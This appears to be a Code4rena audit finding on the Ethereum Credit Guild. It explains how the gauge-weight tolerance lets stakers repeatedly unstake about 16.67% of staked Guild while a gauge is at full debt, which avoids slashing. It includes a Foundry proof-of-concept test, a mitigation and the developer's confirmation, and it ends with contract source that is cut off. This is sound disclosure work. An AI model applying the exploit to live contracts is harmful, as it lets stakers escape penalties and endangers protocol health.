{
  "Title": "[M-19] Over 90% of the Guild staked in a gauge can be unstaked, despite the gauge utilizing its full debt allocation",
  "Content": "\nUsers are incentivized to stake into a gauge in order to increase its debt ceiling. They are also incentivized to maintain the health of the protocol by calling unhealthy loans and offboarding unsound terms, and their staked Guild is subject to being `slashed` if they do not do so effectively. Once the debt ceiling for a gauge is reached, loans will need to be repaid or called in order for stakers to unstake their Guild. This invariant can be observed in the ECG audit page:\n\n> To unstake, the lending term issuance (borrow amount) must be below its debt ceiling, or they must first call one or more loans. This is to ensure no one can exit when they should be slashed.`\n\n*Note: I have also confirmed this to be an invariant of the protocol with the developers*.\n\nBelow I will explain a scenario in which over 90% of staked Guild can be unstaked from a gauge that is currently using its full debt allocation. I will be using the parameters defined in the `GIP_0.sol` deployment script as an example, since these are the parameters that will define the protocol once it is launched:\n\n- `hardCap = 2_000_000e18`.\n- Global debt ceiling (i.e. `bufferCap`) = `2_000_000e18`.\n- `interestRate` = 0.04e18.\n- `maxDebtPerCollateralToken`: 1e18.\n- `maxDelayBetweenPartialRepay` `= 0`.\n- `minPartialRepayPercent` `= 0`.\n- `openingFee` `= 0`.\n\nWe will be utilizing the following state for our example (numbers chosen for easier calculations):\n\n- `2_000_000e18` Guild is staked into the gauge.\n- `2_000_000e18` credit is borrowed (i.e. term is at full debt allocation).\n- Buffer is currently at `0` (i.e. global debt ceiling exhausted).\n- `2_000_000e18` credit is minted via the PSM (for borrowers to redeem the associated `pegToken` with their borrowed credit).\n- thus `issuance` `== 2_000_000e18`\n- thus `totalBorrowerdCredit` `== 2_000_000e18`\n\nWhen a user unstakes from a gauge the following code is invoked:\n\n[GuildToken::\\_decrementGaugeWeight#L224-L233](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/tokens/GuildToken.sol#L224-L233)\n\n```solidity\n224:        uint256 issuance = LendingTerm(gauge).issuance();\n225:        if (issuance != 0) {\n226:            uint256 debtCeilingAfterDecrement = LendingTerm(gauge).debtCeiling(-int256(weight));\n227:            require(\n228:                issuance <= debtCeilingAfterDecrement,\n229:                \"GuildToken: debt ceiling used\"\n230:            );\n231:        }\n232:\n233:        super._decrementGaugeWeight(user, gauge, weight);\n```\n\nAs we can see above, the `LendingTerm::debtCeiling` function is invoked in order to calculate the gauge's debt ceiling after the user's weight is removed from the gauge. The resulting debt ceiling is required to be equal to or greater than the issuance (how much credit is borrowed from the gauge). If the adjusted debt ceiling is at, or  still above, the current issuance, then the the user will be allowed to unstake their weight from the gauge. Let us observe the `debtCeiling` function to see what happens when a user tries to unstake Guild given the provided state mentioned earlier:\n\n[LendingTerm::debtCeiling#L274-L291](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L274C1-L291)\n\n```solidity\n274:        uint256 gaugeWeight = GuildToken(_guildToken).getGaugeWeight(\n275:            address(this)\n276:        );\n277:        gaugeWeight = uint256(int256(gaugeWeight) + gaugeWeightDelta);\n278:        uint256 gaugeType = GuildToken(_guildToken).gaugeType(address(this));\n279:        uint256 totalWeight = GuildToken(_guildToken).totalTypeWeight(\n280:            gaugeType\n281:        );\n282:        uint256 creditMinterBuffer = RateLimitedMinter(refs.creditMinter)\n283:            .buffer();\n284:        uint256 _hardCap = params.hardCap; // cached SLOAD\n285:        if (gaugeWeight == 0) {\n286:            return 0; // no gauge vote, 0 debt ceiling\n287:        } else if (gaugeWeight == totalWeight) {\n288:            // one gauge, unlimited debt ceiling\n289:            // returns min(hardCap, creditMinterBuffer)\n290:            return\n291:                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;\n```\n\nThe adjusted weight is computed on line 277, where `gaugeWeightDelta` is how much weight (Guild) the user wishes to unstake. If the adjusted weight is `0` then the adjusted debt ceiling is considered `0` (no debt ceiling). If the adjusted weight is equal to the total weight of the gauge then the minimum value between the `hardCap` and `buffer` is returned. The first return statement will be invoked if our user is trying to unstake all of the Guild in the gauge. If our user is attempting to unstake `0` Guild, then the second return statement will be invoked and the `buffer`, which is `0`, will be returned. Here is a reminder of the current state we are operating under:\n\n- `totalWeight` = `2_000_000e18`.\n- `gaugeWeight` = `2_000_000e18`.\n- `hardCap` = `2_000_000e18`.\n- buffer `= 0`.\n\nIf our user is attempting to withdraw a value `> 0` and `< totalWeight`, the following code will execute:\n\n[LendingTerm::debtCeiling#L293-L303](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L293-L303)\n\n```solidity\n293:        uint256 _issuance = issuance; // cached SLOAD\n294:        uint256 totalBorrowedCredit = ProfitManager(refs.profitManager)\n295:            .totalBorrowedCredit();\n296:        uint256 gaugeWeightTolerance = ProfitManager(refs.profitManager)\n297:            .gaugeWeightTolerance();\n298:        if (totalBorrowedCredit == 0 && gaugeWeight != 0) {\n299:            // first-ever CREDIT mint on a non-zero gauge weight term\n300:            // does not check the relative debt ceilings\n301:            // returns min(hardCap, creditMinterBuffer)\n302:            return\n303:                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;\n```\n\nThe above return statement will only be invoked if `totalBorrowedCredit` is `0`, meaning there would need to be no current borrows for this gauge. This is not the case for our operating state since the entire `hardCap` of our gauge has been hit, and therefore, `totalBorrowedCredit` is `2_000_000e18`. However, let us take note of the 3 values retrieved in the above code:\n\n- `issuance` = `2_000_000e18`.\n- `totalBorrowedCredit` = `2_000_000e18`.\n- `tolerance` = 1.2e18 (*Note: This `tolerance` allows a gauge to extend 20% beyond its actual debt ceiling*).\n\nSince the above return statement can not be invoked under our operating state, we will continue to the next possible return statement:\n\n[LendingTerm::debtCeiling#L305-L310](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L305-L310)\n\n```solidity\n305:        uint256 toleratedGaugeWeight = (gaugeWeight * gaugeWeightTolerance) /\n306:            1e18;\n307:        uint256 debtCeilingBefore = (totalBorrowedCredit *\n308:            toleratedGaugeWeight) / totalWeight;\n309:        if (_issuance >= debtCeilingBefore) {\n310:            return debtCeilingBefore; // no more borrows allowed\n```\n\nAs seen above, this return statement will be invoked if the `issuance` is equal to or greater than the calculated `debtCeilingBefore`. Therefore, if we can somehow make `debtCeilingBefore == issuance`, then the require statement in `GuildToken::_decrementGaugeWeight` (`issuance <= debtCeilingBefore`) will also pass and we will have successfully unstaked Guild.\n\nHow can we do this? I was intrigued by the function of the `tolerance` and how it can influence (purposely inflate) the debt ceiling of a gauge. I.e. `tolerance` will allow a gauge's debt allocation of 80% to be considered `> 80%`. However, what if the gauge's debt allocation is currently at 100%? It stands to reason that we can decrease the `gaugeWeight` by a specified amount and after the `tolerance` is applied we can potentially produce the same value as the original `totalWeight`. I.e. debt allocation of the gauge remains the same. Given our current operating state we will have to make the `toleratedGaugeWeight == totalWeight`. Once this is achieved, the `debtCeilingBefore` will be equal to `totalBorrowedCredit`, which is equal to `issuance`.\n\nPer my calculations, I found that given the current operating state we will be able to unstake \\~`16.66666...%` of the `totalWeight` at a time. Below, I will demonstrate the calculations for doing so:\n\n```\n// use chisel console\n\n// state\nuint256 issuance = 2000000000000000000000000;\nuint256 totalBorrwedCredit = 2000000000000000000000000;\nuint256 tolerance = 1.2e18;\nuint256 totalWeight = 2000000000000000000000000\n\n// ideal unstakeAmount = totalWeight * .1666666666...\n// solidity does not offer a lot of precision right out of the box so I used python to acquire the necessary precision\n\nuint256 unstakeAmount = 333333333333333333333333;\n\n// calculations\nuint256 gaugeWeight = totalWeight - unstakeAmount;\n// gaugeWeight == 1666666666666666666666667\nuint256 toleratedGaugeWeight = (gaugeWeight * tolerance) / 1e18\n// toleratedGaugeWeight == 2000000000000000000000000\ntoleratedGaugeWeight == totalWeight\n\nuint256 debtCeilingBefore = (totalBorrowedCredit * toleratedGaugeWeight) / totalWeight;\n// debtCeilingBefore == 2000000000000000000000000\ndebtCeilingBefore == issuance\n```\n\nAs we can see above, by utilizing the `tolerance` we were able to control the ratio between `toleratedGaugeWeight` and the `totalWeight`. Provided that the `totalBorrowedCredit` is equal to the `issuance`, we were able to unstake \\~`16.666666...%` of the `totalWeight` from the gauge.\n\n### Impact\n\n`~16.6666%` of the total staked Guild can be unstaked from a gauge currently utilizing its full debt allocation. This can be performed numerous times until over 90% of the total staked Guild has been unstaked. Theoretically, `~16.66666%` can continue to be unstaked until virtually all meaningful Guild is unstaked from the gauge.\n\nThe above breaks an invariant of the protocol and enables Guild stakers to potentially avoid being slashed. Given that the Ethereum Credit Guild relies on properly incentivizing protocol participants to maintain the health of the system, this vulnerability can absolve stakers from punishment and disrupt the effectiveness and efficiency of the protocol, potentially leading to an unhealthy system.\n\n### Proof of Concept\n\nThe following PoC describes the scenario outlined in the `Bug Description`, where `~16.6666....` of the total staked Guild is unstaked from a gauge utilizing its full debt allocation. This is done until over 90% of the staked Guild has been unstaked from the gauge.\n\nPlace the test file inside of the `test/unit/loan/` directory:\n\n<details>\n\n```solidity\n // SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.13;\n\nimport {Clones} from \"@openzeppelin/contracts/proxy/Clones.sol\";\n\nimport {Test} from \"@forge-std/Test.sol\";\nimport {Core} from \"@src/core/Core.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {MockERC20} from \"@test/mock/MockERC20.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\nimport {AuctionHouse} from \"@src/loan/AuctionHouse.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\ncontract UnstakeAtDebtCeiling is Test {\n    address private governor = address(1);\n    address private guardian = address(2);\n    address user = address(0x01010101);\n    address borrower = address(0x02020202);\n    address lender = address(0x03030303);\n    Core private core;\n    ProfitManager private profitManager;\n    CreditToken credit;\n    GuildToken guild;\n    MockERC20 collateral;\n    MockERC20 pegToken;\n    SimplePSM private psm;\n    RateLimitedMinter rlcm;\n    AuctionHouse auctionHouse;\n    LendingTerm term;\n\n    // LendingTerm params (same as deployment script)\n    uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1\n    uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR\n    uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0; \n    uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0; \n    uint256 constant _HARDCAP = 2_000_000e18; // 2 million\n\n    uint256 public issuance = 0;\n\n    function setUp() public {\n        vm.warp(1679067867);\n        vm.roll(16848497);\n        core = new Core();\n\n        profitManager = new ProfitManager(address(core));\n        collateral = new MockERC20();\n        pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)\n        credit = new CreditToken(address(core), \"name\", \"symbol\");\n        guild = new GuildToken(\n            address(core),\n            address(profitManager)\n        );\n        rlcm = new RateLimitedMinter(\n            address(core) /*_core*/,\n            address(credit) /*_token*/,\n            CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,\n            0 /*_maxRateLimitPerSecond*/,\n            0 /*_rateLimitPerSecond*/,\n            uint128(_HARDCAP) /*_bufferCap*/\n        );\n        auctionHouse = new AuctionHouse(address(core), 650, 1800);\n        term = LendingTerm(Clones.clone(address(new LendingTerm())));\n        term.initialize(\n            address(core),\n            LendingTerm.LendingTermReferences({\n                profitManager: address(profitManager),\n                guildToken: address(guild),\n                auctionHouse: address(auctionHouse),\n                creditMinter: address(rlcm),\n                creditToken: address(credit)\n            }),\n            LendingTerm.LendingTermParams({\n                collateralToken: address(collateral),\n                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,\n                interestRate: _INTEREST_RATE,\n                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,\n                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,\n                openingFee: 0,\n                hardCap: _HARDCAP\n            })\n        );\n        psm = new SimplePSM(\n            address(core),\n            address(profitManager),\n            address(credit),\n            address(pegToken)\n        );\n        profitManager.initializeReferences(address(credit), address(guild), address(psm));\n\n        // roles\n        core.grantRole(CoreRoles.GOVERNOR, governor);\n        core.grantRole(CoreRoles.GUARDIAN, guardian);\n        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));\n        core.grantRole(CoreRoles.GUILD_MINTER, address(this));\n        core.grantRole(CoreRoles.GAUGE_ADD, address(this));\n        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));\n        core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));\n        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));\n        core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));\n        core.renounceRole(CoreRoles.GOVERNOR, address(this));\n\n        // add gauge \n        guild.setMaxGauges(10);\n        guild.addGauge(1, address(term));\n    }\n\n    function testUnstakeAtFullDebtAllocation() public {\n        // verify initial state\n        LendingTerm.LendingTermParams memory params = term.getParameters();\n        assertEq(params.hardCap, _HARDCAP);\n        assertEq(term.issuance(), 0);\n        assertEq(credit.totalSupply(), 0);\n        assertEq(psm.redeemableCredit(), 0);\n        assertEq(guild.getGaugeWeight(address(term)), 0);\n        assertEq(rlcm.buffer(), _HARDCAP);\n\n        // 2 million GUILD is staked into term\n        guild.mint(user, _HARDCAP);\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), _HARDCAP);\n        vm.stopPrank();\n        assertEq(guild.getGaugeWeight(address(term)), _HARDCAP);\n        assertEq(guild.getUserWeight(user), _HARDCAP);\n\n        // 2 million CREDIT is borrowed from term\n        uint256 borrowAmount = _HARDCAP;\n        uint256 collateralAmount = _HARDCAP;\n        collateral.mint(borrower, collateralAmount);\n        vm.startPrank(borrower);\n        collateral.approve(address(term), collateralAmount);\n        term.borrow(borrowAmount, collateralAmount);\n        vm.stopPrank();\n        assertEq(term.issuance(), _HARDCAP);\n        assertEq(rlcm.buffer(), 0);\n        assertEq(credit.totalSupply(), _HARDCAP);\n\n        // 2 million CREDIT is minted from PSM\n        pegToken.mint(lender, _HARDCAP);\n        vm.startPrank(lender);\n        pegToken.approve(address(psm), _HARDCAP);\n        psm.mint(lender, _HARDCAP);\n        vm.stopPrank();\n        assertEq(credit.totalSupply(), _HARDCAP * 2);\n        assertEq(psm.redeemableCredit(), _HARDCAP);\n\n        // all 2 million loaned CREDIT gets redeemed in PSM by borrowers\n        vm.startPrank(borrower);\n        credit.approve(address(psm), _HARDCAP);\n        psm.redeem(borrower, _HARDCAP);\n        vm.stopPrank();\n        assertEq(credit.totalSupply(), _HARDCAP);\n        assertEq(psm.redeemableCredit(), 0);\n\n        // verify state\n        assertEq(collateral.balanceOf(address(term)), _HARDCAP);\n        assertEq(credit.balanceOf(borrower), 0);\n        assertEq(credit.balanceOf(lender), _HARDCAP);\n        assertEq(credit.totalSupply(), _HARDCAP);\n        assertEq(term.issuance(), _HARDCAP);\n        assertEq(psm.redeemableCredit(), 0);\n        assertEq(rlcm.buffer(), 0);\n        assertEq(guild.getGaugeWeight(address(term)), _HARDCAP);\n        assertEq(guild.totalWeight(), _HARDCAP);\n        assertEq(guild.getUserWeight(user), _HARDCAP);\n        assertEq(profitManager.gaugeWeightTolerance(), 1.2e18);\n\n        // user tries to unstake various amounts at debtCeiling, but correctly fails\n        vm.startPrank(user);\n\n        vm.expectRevert(\"GuildToken: debt ceiling used\");\n        guild.decrementGauge(address(term), _HARDCAP);\n\n        vm.expectRevert(\"GuildToken: debt ceiling used\");\n        guild.decrementGauge(address(term), 500_000e18);\n\n        vm.expectRevert(\"GuildToken: debt ceiling used\");\n        guild.decrementGauge(address(term), 100e18);\n\n        vm.stopPrank();\n\n        // user successfully unstakes ~16.66%, despite term being at full debt allocation\n        uint256 totalUnstaked;\n        uint256 correction;\n\n        uint256 unstakeAmount = 333333333333333333333333;\n        \n        emit log_named_uint(\"Gauge Weight before unstake\", guild.getGaugeWeight(address(term)));\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n        totalUnstaked += unstakeAmount;\n        \n        emit log_named_uint(\"Gauge Weight after 1st unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(0, totalUnstaked);\n        \n        // user successfully unstakes another ~16.66% \n        correction += 1;\n        unstakeAmount = 277777777777777777777778;\n\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), correction); // to handle rounding issues\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 2nd unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 231481481481481481481481;\n        \n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 3rd unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 192901234567901234567901;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 4th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        correction += 5493827160493827160492; // to make calculations easier\n        unstakeAmount = 161666666666666666666666;\n\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), 5493827160493827160492);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 5th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 134722222222222222222222;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 6th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 112268518518518518518518;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 7th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 93557098765432098765432;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 8th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        correction += 103395061728395061726; // to make calculations easier\n        unstakeAmount = 77981481481481481481481;\n\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), 103395061728395061726);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 9th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 64984567901234567901234;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 10th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        correction += 160493827160493827; // to make calculations easier\n        unstakeAmount = 54153833333333333333333;\n\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), 160493827160493827);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 11th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        unstakeAmount = 45128194444444444444444;\n\n        vm.startPrank(user);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 12th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        // user successfully unstakes another ~16.66%\n        correction += 1;\n        unstakeAmount = 37606828703703703703704;\n\n        vm.startPrank(user);\n        guild.incrementGauge(address(term), 1);\n        guild.decrementGauge(address(term), unstakeAmount);\n        vm.stopPrank();\n\n        totalUnstaked += unstakeAmount;\n\n        emit log_named_uint(\"Gauge Weight after 13th unstake\", guild.getGaugeWeight(address(term)));\n\n        verifyState(correction, totalUnstaked);\n\n        emit log_named_uint(\"Number of GUILD user has unstaked so far\", totalUnstaked);\n\n        // user can keep performing these calculations to unstake more GUILD\n\n        // calculations occurring in `LendingTerm::debtCeiling`:\n        // uint256 totalWeight = guild.totalTypeWeight(1);\n        // uint256 gaugeWeight = totalWeight - unstakeAmount; \n        // uint256 tolerance = profitManager.gaugeWeightTolerance(); // 1.2e18\n\n        // uint256 toleratedGaugeWeight = (gaugeWeight * tolerance) / 1e18; // totalWeight\n\n        // uint256 debtCeilingBefore = (totalBorrowedCredit * toleratedGaugeWeight) / totalWeight; // 2_000_000e18\n\n        // ideal unstakeAmount ~= totalWeight + ((totalBorrowedCredit * totalWeight) / tolerance) *with a lot of precision*\n        // a.k.a totalWeight * .16666... *high high precision*\n\n        // the goal is to make `toleratedGaugeWeight == totalWeight`, assuming that totalBorrowedCredit == issuance\n    }\n\n    function verifyState(uint256 correction, uint256 unstaked) internal {\n        // verify state\n        assertEq(credit.totalSupply(), _HARDCAP);\n        assertEq(term.issuance(), _HARDCAP); // issuance is at hardCap/debtCeiling\n        assertEq(psm.redeemableCredit(), 0);\n        assertEq(rlcm.buffer(), 0); // global debtCeiling hit\n        assertEq(guild.getGaugeWeight(address(term)), _HARDCAP + correction - unstaked);\n        assertEq(guild.totalWeight(), _HARDCAP + correction - unstaked);\n        assertEq(guild.getUserWeight(user), _HARDCAP + correction - unstaked);\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nAn early check can be implemented to identify whether or not the gauge is currently using its full debt allocation. This check must be done *before* the `gaugeWeight` is adjusted. If the current gauge, given its current `gaugeWeight`, is utilizing its full debt allocation, then any attempt to unstake any amount of Guild should revert early.\n\n**[eswak (Ethereum Credit Guild) confirmed and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/475#issuecomment-1885425882):**\n > Confirming this, thanks a lot for the quality of the report!\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-ethereumcreditguild",
  "Code": [
    {
      "filename": "src/tokens/GuildToken.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.13;\n\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {ERC20Permit} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol\";\nimport {ERC20Burnable} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\nimport {ERC20Gauges} from \"@src/tokens/ERC20Gauges.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {ERC20MultiVotes} from \"@src/tokens/ERC20MultiVotes.sol\";\n\n/** \n@title  GUILD ERC20 Token\n@author eswak\n@notice This is the governance token of the Ethereum Credit Guild.\n    On deploy, this token is non-transferrable.\n    During the non-transferrable period, GUILD can still be minted & burnt, only\n    `transfer` and `transferFrom` are reverting.\n\n    The gauge system is used to define debt ceilings on a set of lending terms.\n    Lending terms can be whitelisted by adding a gauge for their address, if GUILD\n    holders vote for these lending terms in the gauge system, the lending terms will\n    have a non-zero debt ceiling, and borrowing will be available under these terms.\n\n    When a lending term creates bad debt, a loss is notified in a gauge on this\n    contract (`notifyGaugeLoss`). When a loss is notified, all the GUILD token weight voting\n    for this gauge becomes non-transferable and can be permissionlessly slashed. Until the\n    loss is realized (`applyGaugeLoss`), a user cannot transfer their locked tokens or\n    decrease the weight they assign to the gauge that suffered a loss.\n    Even when a loss occur, users can still transfer tokens with which they vote for gauges\n    that did not suffer a loss.\n*/\ncontract GuildToken is CoreRef, ERC20Burnable, ERC20Gauges, ERC20MultiVotes {\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    /// @notice reference to ProfitManager\n    address public profitManager;\n\n    constructor(\n        address _core,\n        address _profitManager\n    )\n        CoreRef(_core)\n        ERC20(\"Ethereum Credit Guild - GUILD\", \"GUILD\")\n        ERC20Permit(\"Ethereum Credit Guild - GUILD\")\n    {\n        profitManager = _profitManager;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        VOTING MANAGEMENT\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Set `maxDelegates`, the maximum number of addresses any account can delegate voting power to.\n    function setMaxDelegates(\n        uint256 newMax\n    ) external onlyCoreRole(CoreRoles.GUILD_GOVERNANCE_PARAMETERS) {\n        _setMaxDelegates(newMax);\n    }\n\n    /// @notice Allow or disallow an address to delegate voting power to more addresses than `maxDelegates`.\n    function setContractExceedMaxDelegates(\n        address account,\n        bool canExceedMax\n    ) external onlyCoreRole(CoreRoles.GUILD_GOVERNANCE_PARAMETERS) {\n        _setContractExceedMaxDelegates(account, canExceedMax);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        GAUGE MANAGEMENT\n    //////////////////////////////////////////////////////////////*/\n    function addGauge(\n        uint256 _type,\n        address gauge\n    ) external onlyCoreRole(CoreRoles.GAUGE_ADD) returns (uint256) {\n        return _addGauge(_type, gauge);\n    }\n\n    function removeGauge(\n        address gauge\n    ) external onlyCoreRole(CoreRoles.GAUGE_REMOVE) {\n        _removeGauge(gauge);\n    }\n\n    function setMaxGauges(\n        uint256 max\n    ) external onlyCoreRole(CoreRoles.GAUGE_PARAMETERS) {\n        _setMaxGauges(max);\n    }\n\n    function setCanExceedMaxGauges(\n        address who,\n        bool can\n    ) external onlyCoreRole(CoreRoles.GAUGE_PARAMETERS) {\n        _setCanExceedMaxGauges(who, can);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        LOSS MANAGEMENT\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice emitted when a loss in a gauge is notified.\n    event GaugeLoss(address indexed gauge, uint256 indexed when);\n    /// @notice emitted when a loss in a gauge is applied (for each user).\n    event GaugeLossApply(\n        address indexed gauge,\n        address indexed who,\n        uint256 weight,\n        uint256 when\n    );\n\n    /// @notice last block.timestamp when a loss occurred in a given gauge\n    mapping(address => uint256) public lastGaugeLoss;\n\n    /// @notice last block.timestamp when a user apply a loss that occurred in a given gauge\n    mapping(address => mapping(address => uint256)) public lastGaugeLossApplied;\n\n    /// @notice notify loss in a given gauge\n    function notifyGaugeLoss(address gauge) external {\n        require(msg.sender == profitManager, \"UNAUTHORIZED\");\n\n        // save gauge loss\n        lastGaugeLoss[gauge] = block.timestamp;\n        emit GaugeLoss(gauge, block.timestamp);\n    }\n\n    /// @notice apply a loss that occurred in a given gauge\n    /// anyone can apply the loss on behalf of anyone else\n    function applyGaugeLoss(address gauge, address who) external {\n        // check preconditions\n        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];\n        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][who];\n        require(\n            _lastGaugeLoss != 0 && _lastGaugeLossApplied < _lastGaugeLoss,\n            \"GuildToken: no loss to apply\"\n        );\n\n        // read user weight allocated to the lossy gauge\n        uint256 _userGaugeWeight = getUserGaugeWeight[who][gauge];\n\n        // remove gauge weight allocation\n        lastGaugeLossApplied[gauge][who] = block.timestamp;\n        _decrementGaugeWeight(who, gauge, _userGaugeWeight);\n        if (!_deprecatedGauges.contains(gauge)) {\n            totalTypeWeight[gaugeType[gauge]] -= _userGaugeWeight;\n            totalWeight -= _userGaugeWeight;\n        }\n\n        // apply loss\n        _burn(who, uint256(_userGaugeWeight));\n        emit GaugeLossApply(\n            gauge,\n            who,\n            uint256(_userGaugeWeight),\n            block.timestamp\n        );\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        TRANSFERABILITY\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice at deployment, tokens are not transferable (can only mint/burn).\n    /// Governance can enable transfers with `enableTransfers()`.\n    bool public transferable; // default = false\n\n    /// @notice emitted when transfers are enabled.\n    event TransfersEnabled(uint256 block, uint256 timestamp);\n\n    /// @notice permanently enable token transfers.\n    function enableTransfer() external onlyCoreRole(CoreRoles.GOVERNOR) {\n        transferable = true;\n        emit TransfersEnabled(block.number, block.timestamp);\n    }\n\n    /// @dev prevent transfers if they are not globally enabled.\n    /// mint and burn (transfers to and from address 0) are accepted.\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 /* amount*/\n    ) internal view override {\n        require(\n            transferable || from == address(0) || to == address(0),\n            